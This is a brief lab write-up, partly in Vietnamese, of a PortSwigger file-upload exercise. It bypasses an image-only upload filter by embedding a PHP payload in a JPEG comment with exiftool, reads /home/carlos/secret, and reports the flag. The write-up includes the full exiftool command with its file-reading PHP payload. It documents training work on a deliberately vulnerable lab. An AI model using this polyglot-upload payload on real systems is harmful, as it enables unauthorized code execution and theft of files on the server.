# Target Goal: 
Upload a basic PHP web shell and use it to exfiltrate the contents of the file ``/home/carlos/secret``

# Recon: 
Upload thử 1 shell code php, đương nhiên web sẽ chặn các định dạng khác ngoài file là ảnh

Bài lab này chúng ta sử dụng polygot file cụ thể là Phar file format

Tìm hiểu về PHAR:
https://en.wikipedia.org/wiki/PHAR_(file_format)

Tìm hiểu về polygot file:
https://d47sec.wordpress.com/2021/09/02/tim-hieu-ve-polyglot-file/

Tạo 1 file ảnh nhưng có payload là file php, một số tiêu đề có thể excute được payload là phần comment của ảnh đó:

![image](https://github.com/vanniichan/Portswigger/assets/112863484/ccda1522-b925-4da5-b90b-ff2fb1820aaa)

`exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" liem.jpg -o shelllab.php`

![image](https://github.com/vanniichan/Portswigger/assets/112863484/9a1b82d2-7dcc-4034-be43-42deb9163977)

![image](https://github.com/vanniichan/Portswigger/assets/112863484/8add92a7-5569-457c-8f27-42f885b44a1b)

Open image in new tab -->

# Flag:
`bpUrmh8hkya7p3ST5vhAzWTuUrJKB5c4` 
